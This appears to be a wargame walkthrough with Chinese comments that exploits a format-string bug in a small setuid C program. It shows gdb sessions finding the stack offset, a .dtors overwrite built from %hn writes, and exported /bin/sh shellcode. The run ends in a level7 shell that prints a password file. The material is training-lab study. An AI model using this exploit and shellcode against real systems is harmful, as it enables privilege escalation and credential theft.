
#include <stdio.h> 
#include <stdlib.h>
int main (int argc, char *argv[]) {
        char buf[512];
        if (argc < 2) { printf("%s\n","Failed"); return 1; }
        snprintf(buf, sizeof(buf), argv[1]);
        buf[sizeof (buf) - 1] = '\x00';
        return 0;
}


(gdb) disass main
Dump of assembler code for function main:
0x080483ac <main+0>:    push   %ebp
0x080483ad <main+1>:    mov    %esp,%ebp
0x080483af <main+3>:    sub    $0x218,%esp
0x080483b5 <main+9>:    and    $0xfffffff0,%esp
0x080483b8 <main+12>:   mov    $0x0,%eax
0x080483bd <main+17>:   add    $0xf,%eax
0x080483c0 <main+20>:   add    $0xf,%eax
0x080483c3 <main+23>:   shr    $0x4,%eax
0x080483c6 <main+26>:   shl    $0x4,%eax
0x080483c9 <main+29>:   sub    %eax,%esp
0x080483cb <main+31>:   cmpl   $0x1,0x8(%ebp)
0x080483cf <main+35>:   jg     0x80483f2 <main+70>
0x080483d1 <main+37>:   sub    $0x8,%esp
0x080483d4 <main+40>:   push   $0x80484f8
0x080483d9 <main+45>:   push   $0x80484ff
0x080483de <main+50>:   call   0x80482e0 <printf@plt>
0x080483e3 <main+55>:   add    $0x10,%esp
0x080483e6 <main+58>:   movl   $0x1,-0x20c(%ebp)
0x080483f0 <main+68>:   jmp    0x804841f <main+115>
0x080483f2 <main+70>:   sub    $0x4,%esp
0x080483f5 <main+73>:   mov    0xc(%ebp),%eax
0x080483f8 <main+76>:   add    $0x4,%eax
0x080483fb <main+79>:   pushl  (%eax)
0x080483fd <main+81>:   push   $0x200
0x08048402 <main+86>:   lea    -0x208(%ebp),%eax
0x08048408 <main+92>:   push   %eax
0x08048409 <main+93>:   call   0x80482f0 <snprintf@plt>
0x0804840e <main+98>:   add    $0x10,%esp
0x08048411 <main+101>:  movb   $0x0,-0x9(%ebp)
0x08048415 <main+105>:  movl   $0x0,-0x20c(%ebp)
0x0804841f <main+115>:  mov    -0x20c(%ebp),%eax
0x08048425 <main+121>:  leave  
0x08048426 <main+122>:  ret    
End of assembler dump.
(gdb) 

/* 在main的第一行push %ebp上下断点 */
(gdb) b *0x080483ac
Breakpoint 1 at 0x80483ac

(gdb) r AAAA
Starting program: /tmp/level6/level6 AAAA

Breakpoint 1, 0x080483ac in main ()     /*停在push %ebp上*/
(gdb) x/10x $esp
0xbfffda8c:     0x00e39e9c      0x00000002      0xbfffdb14      0xbfffdb20
0xbfffda9c:     0x003b2828      0x00000000      0x00000001      0x00000001
0xbfffdaac:     0x00000000      0x00f78ff4
/* 由此可知main函数的返回地址为0x00e39e9c，返回地址保存在0xbfffda8c，
   0x00000002是main函数参数argc，0xbfffdb14保存了argv(参数字符串数组的地址)
   (gdb) x/x 0xbfffdb14
   0xbfffdb14:     0xbfffdc2b
   (gdb) x/s 0xbfffdc2b
   0xbfffdc2b:      "/tmp/level6/level6"
   (gdb) x/s *0xbfffdb14
   0xbfffdc2b:      "/tmp/level6/level6"
   (gdb) x/s *0xbfffdb18
   0xbfffdc3e:      "AAAA"
*/
(gdb) r $(perl -e 'print "AAAA"."[%08x]"x(10)') 
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /levels/level6/level6 $(perl -e 'print "AAAA"."[%08x]"x(10)')
/* 不要在perl打印的字符串中含有空格，否则会截断*/
Breakpoint 2, 0x080483ac in main ()
(gdb) c
Continuing.

Breakpoint 1, 0x08048409 in main ()
(gdb) c
Continuing.

Breakpoint 3, 0x0804840e in main ()
(gdb) x/8x $esp
0xbfffd810:     0xbfffd840      0x00000200      0xbfffdc01      0x00000000
0xbfffd820:     0x00000000      0x00000000      0x00000000      0x00000000
(gdb) x/s 0xbfffdc01
0xbfffdc01:      "AAAA[%08x][%08x][%08x][%08x][%08x][%08x][%08x][%08x][%08x][%08x]"
(gdb) x/s 0xbfffd840
0xbfffd840:      "AAAA[00000000][00000000][00000000][00000000][00000000][00000000][00000000][00000000][00000000][41414141]"
(gdb) 

offset = 10
写入地址dtors: 0x8049580 + 4 = 0x8049584
[level6@logic level6]$ objdump -s -j .dtors /levels/level6/level6

/levels/level6/level6:     file format elf32-i386

Contents of section .dtors:
 8049580 ffffffff 00000000                    ........        
[level6@logic level6]$

构造字符串(方法参见Gray Hat Hacking 11章)
[addr + 2]
\x86\x95\x04\x08

[addr]
\x84\x95\x04\x08 

%[HOB-8]x
%.49143x 

%[offset]$hn
%10\$hn 

%[LOB-HOB]x
%.8117x 

%[offset + 1]$hn
%11\$hn

[level6@logic level6]$ export PAYLOAD=$'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'
[level6@logic level6]$ cd /tmp/level6
[level6@logic level6]$ ./getenv PAYLOAD
PAYLOAD is at 0xbfffdfb0
[level6@logic level6]$ cd /levels/level6
[level6@logic level6]$ ./level6 $(python -c "print '\x86\x95\x04\x08\x84\x95\x04\x08'+'%.49143x%10\$hn%.8113x%11\$hn'")
bash-3.2$ whoami
level7
bash-3.2$ cd /home/level7
bash-3.2$ more .pass
oa0Uicia
bash-3.2$ 



   